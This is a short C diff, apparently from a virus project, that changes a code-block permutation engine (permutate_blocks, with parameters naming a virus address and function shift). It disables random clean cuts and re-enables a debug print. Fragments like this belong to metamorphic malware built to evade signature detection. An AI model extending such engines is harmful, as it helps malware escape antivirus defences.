@@ -37,7 +37,8 @@ bool		want_to_cut_clean(size_t block_length, size_t delta,
 	size_t		closeness = (block_length * 100) / delta;
 	uint64_t	rand      = random_inrange(seed, 0, 100);
 
-	return (closeness > rand);
+	// return (closeness > rand);
+	return false;
 }
 
 static bool	split_ref(struct safe_ptr *ref_origin,
@@ -385,7 +386,7 @@ bool		permutate_blocks(struct safe_ptr input_code, \
 			size_t *output_size,
 			void *input_virus_address, int32_t *virus_func_shift, \
 			uint64_t seed)
-{ // TODO adapt proto
+{
 	struct block_allocation		block_memory;
 	struct code_block		*blocks[NBLOCKS];
 
@@ -397,7 +398,7 @@ bool		permutate_blocks(struct safe_ptr input_code, \
 	|| !write_permutated_code(input_code, output_buffer, blocks, output_size))
 		return errors(ERR_THROW, _ERR_PERMUTATE_BLOCKS);
 #ifdef DEBUG
-	// print_split_blocks(block_memory.blocks, NBLOCKS, input_code, output_buffer);
+	print_split_blocks(block_memory.blocks, NBLOCKS, input_code, output_buffer);
 	print_general(input_code, output_buffer, (size_t)input_virus_address, *virus_func_shift, *output_size, seed);
 #endif
 	return true;
